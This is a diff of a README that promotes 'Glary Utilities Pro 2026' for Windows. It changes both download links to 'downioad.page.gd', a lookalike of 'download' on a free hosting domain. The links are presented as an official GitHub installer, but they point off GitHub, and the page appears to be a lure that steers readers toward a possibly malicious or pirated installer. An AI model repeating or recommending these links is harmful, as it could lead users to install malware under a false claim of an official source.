@@ -2,7 +2,7 @@
 
 Glary Utilities Pro 2026 is a comprehensive system optimization software designed for Windows 10 and Windows 11 operating systems. This enhanced edition provides users with a suite of tools to clean, repair, and maintain their computers for optimal performance. With its user-friendly interface and advanced features, Glary Utilities Pro 2026 helps ensure your system runs smoothly and efficiently.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -53,6 +53,6 @@ A: You can uninstall the software through the Windows Control Panel by selecting
 
 To get started, download the latest version of Glary Utilities Pro 2026 from the official GitHub page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 © 2026 Glary Utilities Pro. All rights reserved. Last updated: 2026.
